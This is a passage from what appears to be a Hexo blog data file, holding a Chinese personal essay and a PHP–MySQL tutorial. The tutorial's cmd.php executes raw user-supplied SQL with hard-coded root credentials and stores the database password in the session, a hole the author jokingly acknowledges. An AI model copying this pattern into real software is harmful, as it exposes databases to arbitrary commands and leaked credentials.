Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"你好，世界！\"><a href=\"#你好，世界！\" class=\"headerlink\" title=\"你好，世界！\"></a>你好，世界！</h1><p>​    我想应该所有人（除非真有人已经自大到目空一切的地步），都经常会在一人独处时默默自省吧。</p>\n<p>​    我是个年仅19岁的年轻人，若说有什么人生阅历，那是不可能的。但我也一眨眼就活过了近20年的岁月，20年，总也不算太短。</p>\n<p>这20年的前十年，我想我过得还算快乐（或者我已经把不快乐的部分忘得差不多了，那同样也证明这10年是快乐的）。而这后面十年，</p>\n<p>或许记忆里更多的就是青春的迷惑和成长的痛苦了。</p>\n<p>​    这些所谓的痛苦从何而来？或许是，我给自己定的行为准则与我本身的性格产生的矛盾。</p>\n<p>​    我一直都是个不好不坏的人：有不好不坏的性格，不好不坏的人际交往，不好不坏的家庭，不好不坏的成绩，上一个不好不坏的大学，若事情就这样发展下去，或许最后我会拿一个不好不坏的成绩毕业，找一份不好不坏的程序员工作，拿一份不好不坏的工资，找个不好不坏的老婆，组个不好不坏的家庭，生个不好不坏的孩子，不好不坏的养他（她）长大，退休后和几个关系不好不坏的老伙计整天玩乐，最后不好不坏的过完这一生。</p>\n<p>​    为什么我每件事都做得不好不坏？无论大事小事，就没有做的特别出类拔萃的？（追求出类拔萃，这也是一个痛苦的源泉吧，可我确实不甘心不好不坏、不上不下地过完这一生）因为我不能做到“取舍”。</p>\n<p>​    “舍得”，是我这辈子做的最差的事，无论事大事小，我“舍不得”，这就是为什么我永远看起来还可以却又不是很出色。或许我是有一些能力的，能够把一些事情做好，但并不能把所有事情做好，而那些不是非常重要而又有些在意的东西，我学不会割舍。</p>\n<p>​    但仅仅将我现在的处境归咎于不会“割舍”，实在是过于粗暴了。我一直在找一种平衡，一种精神世界与现实生活之间融洽相处的平衡点，可这样的平衡点或许并不存在。人生本来就有很多求而不得的事，对于那样的事，无需多想，就尽自己<strong>应该尽的力</strong>，尔后将它的结果交给老天来决定好了。而那些可望而可求的事，才是更重要、最值得付出最大限度地精力与意愿去达成它。但又不应该觉得“努力了就能成功”，这个世界上，没有谁是主角，能够永远成功，永远顺心如意。</p>\n<p>​    学会割舍，学会接受失败，学会接受自己，找到真实的自己。尽力而行，量力而行。</p>\n<p>​    最重要的，找到活在这人世间的快乐，始终牢记自己为了什么而努力，不是为了那些世俗的价值和欲望，是为了“<strong>我</strong>”。好好的生活，享受这世间的每一分每一秒。</p>\n"},{"layout":"post","title":"php连接mysql","date":"2020-09-28T16:00:00.000Z","description":"如何将php页面与mysql数据库连接起来并输入指令","_content":"\n# php连接MySQL\n\n## 用mysqli以面向对象的方式连接mysql数据库\n\n在本地网站建一个这样的index.php,就能连接到本地MySQL服务器了，以下代码纯手撸~ 可以自行输入服务器名，用户，密码\n\n```php+HTML\n<?php\nif($_POST['servername']&&$_POST['username']&&$_POST['passwd'])\n{\n        $servername=$_POST['servername'];\n        $username=$_POST['username'];\n        $password=$_POST['passwd'];\n// $dbname=$_GET['dbname'];\n\n        $sql = new mysqli($servername,$username,$password);\n        if($sql->connect_error)\n        {\n                die(\"连接失败：\".$sql->connect_error);\n        }\n        else\n        {\n                echo \"<script>alert(\\\"连接成功\\\")</script>\";\n                // header('Location:cmd.php');\n                // exit;\n                $url = \"cmd.php\";\n                echo \"<script language='javascript' type='text/javascript'>\";\n                echo \"window.location.href='$url'\";\n                echo \"</script>\";\n        }\n}\nelse\n{\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n        <title>连接数据库</title>\n</head>\n<body>\n        <p>\n        请输入服务器，用户名以及密码\n        </p>\n        <form action=\"index.php\" method=\"post\">\n        服务器：<input type=\"text\" name=\"servername\">\n        用户名：<input type=\"text\" name=\"username\">\n        密码：<input type=\"password\" name=\"passwd\">\n        <input type=\"submit\" value=\"提交\">\n        </form>\n        <p id=\"success\">\n        </p>\n</body>\n</html>\n<?php\n}\n?>\n```\n\n访问页面\n\n![](\\img\\连接数据库.png)\n\n这里输入啥就可以登陆啥了，我这里以root用户登录localhost\n\n连接成功！\n\n![](\\img\\连接成功.png)\n\n我这里设计了一个可以提交mysql命令的页面（注入漏洞警告！）\n\n![](\\img\\提交命令.png)\n\n提交以后，嘻嘻，这样就没法注入了吧\n\n![](\\img\\成功了也不给你看.png)\n\ncmd.php的源码\n\n```php+HTML\n<?php\n\n$servername='localhost';\n$username='root';\n$password='root';\n// $dbname=$_GET['dbname'];\n\n$sql = new mysqli($servername,$username,$password);\nif($_GET['cmd'])\n{\n        $cmd=$_GET['cmd'];\n        if($sql->query($cmd))\n        {\n                echo \"命令执行成功，但我就不给你看结果,嘻嘻\";\n        }\n        else{\n                echo \"执行失败\".\"Error:\".$sql->error;\n        }\n}\nelse{\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>输入SQL命令</title>\n</head>\n<body>\n<p>\n输入SQL命令：\n</p>\n<form action=\"cmd.php\" mothod=\"get\">\n<input type=\"text\" name=\"cmd\" value=\"USE mysql\">\n<input type=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n<?php\n}\n?>\n```\n\n实际上，应该用session来继承从index页面获得的数据，这里我偷个懒，用session的实现留到以后再说\n\n。。。\n\n好的，三天过去了。我来接着水用cookie或session来实现的方法了\n\n只要将上面的代码改造一点点，改成下面这样\n\n```php+HTML\n//index.php\n<?php\nif($_POST['servername']&&$_POST['username']&&$_POST['passwd'])\n{\n        $servername=$_POST['servername'];\n        $username=$_POST['username'];\n        $password=$_POST['passwd'];\n// $dbname=$_GET['dbname'];\n\n        $sql = new mysqli($servername,$username,$password);\n        if($sql->connect_error)\n        {\n                die(\"连接失败：\".$sql->connect_error);\n        }\n        else\n        {\n                session_start();\n                //开启session\n                $lifetime=3600 * 24;    //设置cookie生存周期为1天\n                setcookie(session_name(),session_id(),time() + $lifetime,\"/\");\n            \t//如果没有这行代码，服务器也会生成一个临时session\n                $_SESSION['servername']=$servername;\n                $_SESSION['username']=$username;\n                $_SESSION['passwd']=$password;\n                echo \"<script>alert(\\\"连接成功\\\")</script>\";\n                // header('Location:cmd.php');\n                // exit;\n                $url = \"cmd.php\";\n                echo \"<script language='javascript' type='text/javascript'>\";\n                echo \"window.location.href='$url'\";\n                echo \"</script>\";\n        }\n}\nelse\n{\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n        <title>连接数据库</title>\n</head>\n<body>\n        <p>\n        请输入服务器，用户名以及密码\n        </p>\n        <form action=\"index.php\" method=\"post\">\n        服务器：<input type=\"text\" name=\"servername\">\n        用户名：<input type=\"text\" name=\"username\">\n        密码：<input type=\"password\" name=\"passwd\">\n        <input type=\"submit\" value=\"提交\">\n        </form>\n        <p id=\"success\">\n        </p>\n</body>\n</html>\n<?php\n}\n?>\n```\n\n```php+HTML\n//cmd.php\n<?php\n\nsession_start();\n$servername=$_SESSION['servername'];\n$username=$_SESSION['username'];\n$password=$_SESSION['passwd'];\n// $dbname=$_GET['dbname'];\n\n$sql = new mysqli($servername,$username,$password);\nif($sql->connect_error){\n        die(\"连接失败\".$sql->connect_error);\n}\nif(!empty($_POST['cmd'])){\n        $cmd=$_POST['cmd'];\n        if($sql->query(\"$cmd\")===TRUE)\n        {\n                echo \"命令执行成功，但我就不给你看结果,嘻嘻\";\n        }\n        else{\n                echo \"执行失败\".\"Error:\".$sql->error;\n        }\n}\nelse{\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>输入SQL命令</title>\n</head>\n<body>\n<p>\n输入SQL命令：\n</p>\n<form action=\"cmd.php\" method=\"post\">\n        <input type=\"text\" name=\"cmd\" value=\"USE mysql\">\n        <input type=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n<?php\n}\n?>\n```\n\n上面代码开启了session，配置cookie保存session ID（手动设置了session生存周期为1天），用session保存了'servername'，'username'，'password'（一般来说最好不要保存这么多重要信息），并在index.php转到cmd.php时用session保证信息传递\n\n运行结果\n\n![](E:\\文档\\Github仓库\\LiGuHeiYi\\LiGuHeiYi.github.io\\img\\session连接.png)\n\n![](E:\\文档\\Github仓库\\LiGuHeiYi\\LiGuHeiYi.github.io\\img\\session连接弹窗.png)\n\n![](E:\\文档\\Github仓库\\LiGuHeiYi\\LiGuHeiYi.github.io\\img\\session连接成功.png)\n\n**没有报错，所以利用session传递用户信息和连接数据库成功了。**\n\n\n\n## 用PDO连接mysql数据库\n\n在Windows用pdo之前需要在php.ini里，将pdo拓展打开，具体方法是将# extension = php_pdo.dll这一行注释去掉(phpstudy已经做完了这一步)，然后需要连接哪种数据库就再去掉哪种数据库的注释。PDO(php database object)最大的优点就是可以连接不止mysql这一种数据库，比较方便的地方是可以使用异常类来处理程序运行时出现的问题，像下面代码可以将执行部分放在try{}模块中，发生异常直接获得信息，不用像上面sqli一样每次都判断一下执行是否成功\n\n```php\n<?php\n$servername = \"localhost\";\n$username = \"root\";\n$password = \"root\";\n\ntry {\n    $conn = new PDO(\"mysql:host=$servername;\", $username, $password);//建立连接对象\n    echo \"连接成功\";\n}\ncatch(PDOException $e)\n{\n    echo $e->getMessage();\n}\n?>\n```\n\n还是放到phpstudy的本地网站里，打开网站\n\n![](\\img\\pdo connect.png)\n\n\n\n## 预处理语句及绑定参数\n\n预处理语句用于执行多个相同的 SQL 语句，并且执行效率更高。\n\n预处理语句的工作原理如下：\n\n1. 预处理：**创建 SQL 语句模板**并发送到数据库。预留的值使用参数 \"**?**\" 标记 。例如：\n\n   ```\n   INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)\n   ```\n\n2. 数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出。\n\n3. 执行：最后，将应用绑定的值传递给参数（\"?\" 标记），数据库执行语句。应用可以多次执行语句，如果参数的值不一样。\n\n相比于直接执行SQL语句，预处理语句有两个主要优点：\n\n- 预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）。\n\n- 绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句。\n\n- 预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。\n\n  ### PDO 中的预处理语句\n\n  #### 实例 (PDO 使用预处理语句)\n\n  ```php\n  <?php\n  $servername = \"localhost\";\n  $username = \"root\";\n  $password = \"root\";\n  $dbname = \"myDBPDO\";\n   \n  try {\n      $conn = new PDO(\"mysql:host=$servername;dbname=$dbname\", $username, $password);\n      // 设置 PDO 错误模式为异常\n      $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n   \n      // 预处理 SQL 并绑定参数\n      $stmt = $conn->prepare(\"INSERT INTO MyGuests (firstname, lastname, email) \n      VALUES (:firstname, :lastname, :email)\");\n      $stmt->bindParam(':firstname', $firstname);\n      $stmt->bindParam(':lastname', $lastname);\n      $stmt->bindParam(':email', $email);\n   \n      // 插入多行数据\n      $firstname = \"John\";\n      $lastname = \"Doe\";\n      $email = \"john@example.com\";\n      $stmt->execute();\n   \n      $firstname = \"Mary\";\n      $lastname = \"Moe\";\n      $email = \"mary@example.com\";\n      $stmt->execute();\n   \n      $firstname = \"Julie\";\n      $lastname = \"Dooley\";\n      $email = \"julie@example.com\";\n      $stmt->execute();\n   \n      echo \"新记录插入成功\";\n  }\n  catch(PDOException $e)\n  {\n      echo \"Error: \" . $e->getMessage();\n  }\n  $conn = null;\n  ?>\n  \n  ```\n\n  \n\n## 关闭连接\n\n连接在脚本执行完后会自动关闭。但也可以使用以下代码来关闭连接：\n\n#### 实例 (MySQLi - 面向对象)\n\n```php\n$conn->close();\n```\n\n\n\n#### 实例 (MySQLi - 面向过程)\n\n```php\nmysqli_close($conn);\n```\n\n\n\n#### 实例 (PDO)\n\n```php\n$conn = null;\n```\n\n","source":"_posts/2020-09-26-php连接mysql.md","raw":"---\nlayout: post\ntitle: php连接mysql\ndate: 2020-9-29\ncategories: blog\ntags: [php,MySQL]\ndescription: 如何将php页面与mysql数据库连接起来并输入指令\n---\n\n# php连接MySQL\n\n## 用mysqli以面向对象的方式连接mysql数据库\n\n在本地网站建一个这样的index.php,就能连接到本地MySQL服务器了，以下代码纯手撸~ 可以自行输入服务器名，用户，密码\n\n```php+HTML\n<?php\nif($_POST['servername']&&$_POST['username']&&$_POST['passwd'])\n{\n        $servername=$_POST['servername'];\n        $username=$_POST['username'];\n        $password=$_POST['passwd'];\n// $dbname=$_GET['dbname'];\n\n        $sql = new mysqli($servername,$username,$password);\n        if($sql->connect_error)\n        {\n                die(\"连接失败：\".$sql->connect_error);\n        }\n        else\n        {\n                echo \"<script>alert(\\\"连接成功\\\")</script>\";\n                // header('Location:cmd.php');\n                // exit;\n                $url = \"cmd.php\";\n                echo \"<script language='javascript' type='text/javascript'>\";\n                echo \"window.location.href='$url'\";\n                echo \"</script>\";\n        }\n}\nelse\n{\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n        <title>连接数据库</title>\n</head>\n<body>\n        <p>\n        请输入服务器，用户名以及密码\n        </p>\n        <form action=\"index.php\" method=\"post\">\n        服务器：<input type=\"text\" name=\"servername\">\n        用户名：<input type=\"text\" name=\"username\">\n        密码：<input type=\"password\" name=\"passwd\">\n        <input type=\"submit\" value=\"提交\">\n        </form>\n        <p id=\"success\">\n        </p>\n</body>\n</html>\n<?php\n}\n?>\n```\n\n访问页面\n\n![](\\img\\连接数据库.png)\n\n这里输入啥就可以登陆啥了，我这里以root用户登录localhost\n\n连接成功！\n\n![](\\img\\连接成功.png)\n\n我这里设计了一个可以提交mysql命令的页面（注入漏洞警告！）\n\n![](\\img\\提交命令.png)\n\n提交以后，嘻嘻，这样就没法注入了吧\n\n![](\\img\\成功了也不给你看.png)\n\ncmd.php的源码\n\n```php+HTML\n<?php\n\n$servername='localhost';\n$username='root';\n$password='root';\n// $dbname=$_GET['dbname'];\n\n$sql = new mysqli($servername,$username,$password);\nif($_GET['cmd'])\n{\n        $cmd=$_GET['cmd'];\n        if($sql->query($cmd))\n        {\n                echo \"命令执行成功，但我就不给你看结果,嘻嘻\";\n        }\n        else{\n                echo \"执行失败\".\"Error:\".$sql->error;\n        }\n}\nelse{\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>输入SQL命令</title>\n</head>\n<body>\n<p>\n输入SQL命令：\n</p>\n<form action=\"cmd.php\" mothod=\"get\">\n<input type=\"text\" name=\"cmd\" value=\"USE mysql\">\n<input type=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n<?php\n}\n?>\n```\n\n实际上，应该用session来继承从index页面获得的数据，这里我偷个懒，用session的实现留到以后再说\n\n。。。\n\n好的，三天过去了。我来接着水用cookie或session来实现的方法了\n\n只要将上面的代码改造一点点，改成下面这样\n\n```php+HTML\n//index.php\n<?php\nif($_POST['servername']&&$_POST['username']&&$_POST['passwd'])\n{\n        $servername=$_POST['servername'];\n        $username=$_POST['username'];\n        $password=$_POST['passwd'];\n// $dbname=$_GET['dbname'];\n\n        $sql = new mysqli($servername,$username,$password);\n        if($sql->connect_error)\n        {\n                die(\"连接失败：\".$sql->connect_error);\n        }\n        else\n        {\n                session_start();\n                //开启session\n                $lifetime=3600 * 24;    //设置cookie生存周期为1天\n                setcookie(session_name(),session_id(),time() + $lifetime,\"/\");\n            \t//如果没有这行代码，服务器也会生成一个临时session\n                $_SESSION['servername']=$servername;\n                $_SESSION['username']=$username;\n                $_SESSION['passwd']=$password;\n                echo \"<script>alert(\\\"连接成功\\\")</script>\";\n                // header('Location:cmd.php');\n                // exit;\n                $url = \"cmd.php\";\n                echo \"<script language='javascript' type='text/javascript'>\";\n                echo \"window.location.href='$url'\";\n                echo \"</script>\";\n        }\n}\nelse\n{\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n        <title>连接数据库</title>\n</head>\n<body>\n        <p>\n        请输入服务器，用户名以及密码\n        </p>\n        <form action=\"index.php\" method=\"post\">\n        服务器：<input type=\"text\" name=\"servername\">\n        用户名：<input type=\"text\" name=\"username\">\n        密码：<input type=\"password\" name=\"passwd\">\n        <input type=\"submit\" value=\"提交\">\n        </form>\n        <p id=\"success\">\n        </p>\n</body>\n</html>\n<?php\n}\n?>\n```\n\n```php+HTML\n//cmd.php\n<?php\n\nsession_start();\n$servername=$_SESSION['servername'];\n$username=$_SESSION['username'];\n$password=$_SESSION['passwd'];\n// $dbname=$_GET['dbname'];\n\n$sql = new mysqli($servername,$username,$password);\nif($sql->connect_error){\n        die(\"连接失败\".$sql->connect_error);\n}\nif(!empty($_POST['cmd'])){\n        $cmd=$_POST['cmd'];\n        if($sql->query(\"$cmd\")===TRUE)\n        {\n                echo \"命令执行成功，但我就不给你看结果,嘻嘻\";\n        }\n        else{\n                echo \"执行失败\".\"Error:\".$sql->error;\n        }\n}\nelse{\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>输入SQL命令</title>\n</head>\n<body>\n<p>\n输入SQL命令：\n</p>\n<form action=\"cmd.php\" method=\"post\">\n        <input type=\"text\" name=\"cmd\" value=\"USE mysql\">\n        <input type=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n<?php\n}\n?>\n```\n\n上面代码开启了session，配置cookie保存session ID（手动设置了session生存周期为1天），用session保存了'servername'，'username'，'password'（一般来说最好不要保存这么多重要信息），并在index.php转到cmd.php时用session保证信息传递\n\n运行结果\n\n![](E:\\文档\\Github仓库\\LiGuHeiYi\\LiGuHeiYi.github.io\\img\\session连接.png)\n\n![](E:\\文档\\Github仓库\\LiGuHeiYi\\LiGuHeiYi.github.io\\img\\session连接弹窗.png)\n\n![](E:\\文档\\Github仓库\\LiGuHeiYi\\LiGuHeiYi.github.io\\img\\session连接成功.png)\n\n**没有报错，所以利用session传递用户信息和连接数据库成功了。**\n\n\n\n## 用PDO连接mysql数据库\n\n在Windows用pdo之前需要在php.ini里，将pdo拓展打开，具体方法是将# extension = php_pdo.dll这一行注释去掉(phpstudy已经做完了这一步)，然后需要连接哪种数据库就再去掉哪种数据库的注释。PDO(php database object)最大的优点就是可以连接不止mysql这一种数据库，比较方便的地方是可以使用异常类来处理程序运行时出现的问题，像下面代码可以将执行部分放在try{}模块中，发生异常直接获得信息，不用像上面sqli一样每次都判断一下执行是否成功\n\n```php\n<?php\n$servername = \"localhost\";\n$username = \"root\";\n$password = \"root\";\n\ntry {\n    $conn = new PDO(\"mysql:host=$servername;\", $username, $password);//建立连接对象\n    echo \"连接成功\";\n}\ncatch(PDOException $e)\n{\n    echo $e->getMessage();\n}\n?>\n```\n\n还是放到phpstudy的本地网站里，打开网站\n\n![](\\img\\pdo connect.png)\n\n\n\n## 预处理语句及绑定参数\n\n预处理语句用于执行多个相同的 SQL 语句，并且执行效率更高。\n\n预处理语句的工作原理如下：\n\n1. 预处理：**创建 SQL 语句模板**并发送到数据库。预留的值使用参数 \"**?**\" 标记 。例如：\n\n   ```\n   INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)\n   ```\n\n2. 数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出。\n\n3. 执行：最后，将应用绑定的值传递给参数（\"?\" 标记），数据库执行语句。应用可以多次执行语句，如果参数的值不一样。\n\n相比于直接执行SQL语句，预处理语句有两个主要优点：\n\n- 预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）。\n\n- 绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句。\n\n- 预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。\n\n  ### PDO 中的预处理语句\n\n  #### 实例 (PDO 使用预处理语句)\n\n  ```php\n  <?php\n  $servername = \"localhost\";\n  $username = \"root\";\n  $password = \"root\";\n  $dbname = \"myDBPDO\";\n   \n  try {\n      $conn = new PDO(\"mysql:host=$servername;dbname=$dbname\", $username, $password);\n      // 设置 PDO 错误模式为异常\n      $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n   \n      // 预处理 SQL 并绑定参数\n      $stmt = $conn->prepare(\"INSERT INTO MyGuests (firstname, lastname, email) \n      VALUES (:firstname, :lastname, :email)\");\n      $stmt->bindParam(':firstname', $firstname);\n      $stmt->bindParam(':lastname', $lastname);\n      $stmt->bindParam(':email', $email);\n   \n      // 插入多行数据\n      $firstname = \"John\";\n      $lastname = \"Doe\";\n      $email = \"john@example.com\";\n      $stmt->execute();\n   \n      $firstname = \"Mary\";\n      $lastname = \"Moe\";\n      $email = \"mary@example.com\";\n      $stmt->execute();\n   \n      $firstname = \"Julie\";\n      $lastname = \"Dooley\";\n      $email = \"julie@example.com\";\n      $stmt->execute();\n   \n      echo \"新记录插入成功\";\n  }\n  catch(PDOException $e)\n  {\n      echo \"Error: \" . $e->getMessage();\n  }\n  $conn = null;\n  ?>\n  \n  ```\n\n  \n\n## 关闭连接\n\n连接在脚本执行完后会自动关闭。但也可以使用以下代码来关闭连接：\n\n#### 实例 (MySQLi - 面向对象)\n\n```php\n$conn->close();\n```\n\n\n\n#### 实例 (MySQLi - 面向过程)\n\n```php\nmysqli_close($conn);\n```\n\n\n\n#### 实例 (PDO)\n\n```php\n$conn = null;\n```\n\n","slug":"2020-09-26-php连接mysql","published":1,"updated":"2020-10-04T18:10:21.431Z","comments":1,"photos":[],"link":"","_id":"ckkntx9j70008xov79ic0k7bb","content":"<h1 id=\"php连接MySQL\"><a href=\"#php连接MySQL\" class=\"headerlink\" title=\"php连接MySQL\"></a>php连接MySQL</h1><h2 id=\"用mysqli以面向对象的方式连接mysql数据库\"><a href=\"#用mysqli以面向对象的方式连接mysql数据库\" class=\"headerlink\" title=\"用mysqli以面向对象的方式连接mysql数据库\"></a>用mysqli以面向对象的方式连接mysql数据库</h2><p>在本地网站建一个这样的index.php,就能连接到本地MySQL服务器了，以下代码纯手撸~ 可以自行输入服务器名，用户，密码</p>\n<pre class=\"line-numbers language-php+HTML\"><code class=\"language-php+HTML\"><?php\nif($_POST['servername']&&$_POST['username']&&$_POST['passwd'])\n{\n        $servername=$_POST['servername'];\n        $username=$_POST['username'];\n        $password=$_POST['passwd'];\n// $dbname=$_GET['dbname'];\n\n        $sql = new mysqli($servername,$username,$password);\n        if($sql->connect_error)\n        {\n                die(\"连接失败：\".$sql->connect_error);\n        }\n        else\n        {\n                echo \"<script>alert(\\\"连接成功\\\")</script>\";\n                // header('Location:cmd.php');\n                // exit;\n                $url = \"cmd.php\";\n                echo \"<script language='javascript' type='text/javascript'>\";\n                echo \"window.location.href='$url'\";\n                echo \"</script>\";\n        }\n}\nelse\n{\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n        <title>连接数据库</title>\n</head>\n<body>\n        <p>\n        请输入服务器，用户名以及密码\n        </p>\n        <form action=\"index.php\" method=\"post\">\n        服务器：<input type=\"text\" name=\"servername\">\n        用户名：<input type=\"text\" name=\"username\">\n        密码：<input type=\"password\" name=\"passwd\">\n        <input type=\"submit\" value=\"提交\">\n        </form>\n        <p id=\"success\">\n        </p>\n</body>\n</html>\n<?php\n}\n?><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>访问页面</p>\n<p><img src=\"%5Cimg%5C%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93.png\" alt=\"\"></p>\n<p>这里输入啥就可以登陆啥了，我这里以root用户登录localhost</p>\n<p>连接成功！</p>\n<p><img src=\"%5Cimg%5C%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png\" alt=\"\"></p>\n<p>我这里设计了一个可以提交mysql命令的页面（注入漏洞警告！）</p>\n<p><img src=\"%5Cimg%5C%E6%8F%90%E4%BA%A4%E5%91%BD%E4%BB%A4.png\" alt=\"\"></p>\n<p>提交以后，嘻嘻，这样就没法注入了吧</p>\n<p><img src=\"%5Cimg%5C%E6%88%90%E5%8A%9F%E4%BA%86%E4%B9%9F%E4%B8%8D%E7%BB%99%E4%BD%A0%E7%9C%8B.png\" alt=\"\"></p>\n<p>cmd.php的源码</p>\n<pre class=\"line-numbers language-php+HTML\"><code class=\"language-php+HTML\"><?php\n\n$servername='localhost';\n$username='root';\n$password='root';\n// $dbname=$_GET['dbname'];\n\n$sql = new mysqli($servername,$username,$password);\nif($_GET['cmd'])\n{\n        $cmd=$_GET['cmd'];\n        if($sql->query($cmd))\n        {\n                echo \"命令执行成功，但我就不给你看结果,嘻嘻\";\n        }\n        else{\n                echo \"执行失败\".\"Error:\".$sql->error;\n        }\n}\nelse{\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>输入SQL命令</title>\n</head>\n<body>\n<p>\n输入SQL命令：\n</p>\n<form action=\"cmd.php\" mothod=\"get\">\n<input type=\"text\" name=\"cmd\" value=\"USE mysql\">\n<input type=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n<?php\n}\n?><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>实际上，应该用session来继承从index页面获得的数据，这里我偷个懒，用session的实现留到以后再说</p>\n<p>。。。</p>\n<p>好的，三天过去了。我来接着水用cookie或session来实现的方法了</p>\n<p>只要将上面的代码改造一点点，改成下面这样</p>\n<pre class=\"line-numbers language-php+HTML\"><code class=\"language-php+HTML\">//index.php\n<?php\nif($_POST['servername']&&$_POST['username']&&$_POST['passwd'])\n{\n        $servername=$_POST['servername'];\n        $username=$_POST['username'];\n        $password=$_POST['passwd'];\n// $dbname=$_GET['dbname'];\n\n        $sql = new mysqli($servername,$username,$password);\n        if($sql->connect_error)\n        {\n                die(\"连接失败：\".$sql->connect_error);\n        }\n        else\n        {\n                session_start();\n                //开启session\n                $lifetime=3600 * 24;    //设置cookie生存周期为1天\n                setcookie(session_name(),session_id(),time() + $lifetime,\"/\");\n                //如果没有这行代码，服务器也会生成一个临时session\n                $_SESSION['servername']=$servername;\n                $_SESSION['username']=$username;\n                $_SESSION['passwd']=$password;\n                echo \"<script>alert(\\\"连接成功\\\")</script>\";\n                // header('Location:cmd.php');\n                // exit;\n                $url = \"cmd.php\";\n                echo \"<script language='javascript' type='text/javascript'>\";\n                echo \"window.location.href='$url'\";\n                echo \"</script>\";\n        }\n}\nelse\n{\n?>\n<!DOCTYPE 